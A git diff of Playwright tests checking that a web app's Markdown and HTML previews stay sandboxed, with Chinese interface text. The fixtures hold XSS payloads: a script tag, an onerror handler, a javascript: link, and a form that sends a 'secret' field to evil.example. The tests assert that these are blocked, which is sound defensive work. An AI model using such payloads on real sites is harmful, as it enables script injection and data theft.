@@ -1,3 +1,4 @@
+import { HTML_PREVIEW_CSP, htmlPreviewDocument } from "../../src/server/documents/html";
 import { expect, test, type Page, type Route } from "@playwright/test";
 import { makeConversation, mockConsole } from "./mock-api";
 
@@ -604,7 +605,7 @@ test("Markdown deliverables have readable titles, formatted preview, source togg
   await expect(dialog).toHaveCount(0);
 });
 
-test("Markdown preview cannot execute HTML and leaves HTML files as source",async({page})=>{
+test("Markdown preview cannot execute HTML and truncated HTML stays source",async({page})=>{
   await mockDocuments(page);
   const content='# 安全文档\n\n<script>window.previewPwned=1</script><form action="https://evil.example"><input name="secret"><button>发送秘密</button></form><iframe src="https://evil.example"></iframe><img src=x onerror="window.previewPwned=1"><a href="javascript:alert(1)">危险链接</a>\n\n**可阅读内容**';
   await page.route('**/api/documents/text**',r=>r.fulfill({json:{text:content,truncated:true}}));
@@ -619,4 +620,38 @@ test("Markdown preview cannot execute HTML and leaves HTML files as source",asyn
   await page.getByRole('button',{name:'预览 网页源码',exact:true}).click();
   await expect(page.getByTestId('file-preview-text')).toContainText('<script>');
   await expect(page.getByTestId('file-preview-markdown')).toHaveCount(0);
+});
+
+test("HTML cards render interactive isolated pages with source and download on mobile",async({page},info)=>{
+  await mockDocuments(page);
+  const html=`<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:20px;font:16px system-ui;background:#eef4ff}button{padding:12px}.card{padding:16px;background:white;border-radius:16px}</style></head><body><h1>周末安排</h1><div class="card"><button onclick="this.textContent='已展开'">展开安排</button><p id="isolation"></p></div><script>
+    try { parent.document.body.dataset.compromised='yes'; } catch(e) { document.querySelector('#isolation').textContent='已隔离'; }
+    try { localStorage.setItem('bad','yes'); } catch(e) { document.body.dataset.storage='blocked'; }
+    fetch('/api/status').then(()=>document.body.dataset.network='allowed').catch(()=>document.body.dataset.network='blocked');
+  </script></body></html>`;
+  await page.route('**/api/documents/text**',r=>r.fulfill({json:{text:html,truncated:false}}));
+  await page.route('**/api/documents/html**',r=>r.fulfill({headers:{'content-type':'text/html; charset=utf-8','content-security-policy':HTML_PREVIEW_CSP},body:htmlPreviewDocument(html)}));
+  await openConversation(page,'html-demo','[周末安排](/home/gem/workspace/demo.html)');
+  await page.route('**/api/workspace/ticket',r=>r.fulfill({json:{url:'/api/documents/html?path=demo.html'}}));
+  await page.getByRole('button',{name:'预览 周末安排',exact:true}).click();
+  const frame=page.frameLocator('[data-testid="file-preview-html"]');
+  await expect(frame.getByRole('heading',{name:'周末安排'})).toBeVisible();
+  await frame.getByRole('button',{name:'展开安排'}).click();
+  await expect(frame.getByRole('button',{name:'已展开'})).toBeVisible();
+  await expect(frame.locator('#isolation')).toHaveText('已隔离');
+  await expect(frame.locator('body')).toHaveAttribute('data-storage','blocked');
+  await expect(frame.locator('body')).toHaveAttribute('data-network','blocked');
+  expect(await page.locator('body').getAttribute('data-compromised')).toBeNull();
+  const dialog=page.getByRole('dialog');
+  await dialog.getByRole('button',{name:'源码',exact:true}).click();
+  await expect(page.getByTestId('file-preview-text')).toContainText('<script>');
+  await dialog.getByRole('button',{name:'页面',exact:true}).click();
+  await expect(frame.getByRole('heading',{name:'周末安排'})).toBeVisible();
+  await expect(page.getByTestId('file-preview-download')).toBeVisible();
+  for(const width of info.project.name.startsWith('mobile')?[390,360]:[1440]){
+    await page.setViewportSize({width,height:844});
+    const box=await page.getByTestId('file-preview-html').boundingBox();expect(box!.height).toBeGreaterThan(400);
+    expect(await page.evaluate(()=>document.documentElement.scrollWidth-document.documentElement.clientWidth)).toBeLessThanOrEqual(1);
+  }
+  await page.screenshot({path:`/Users/mengxiao/workspace/.scratch/artifacts/aio-natural-followups/html-${info.project.name}.png`});
 });
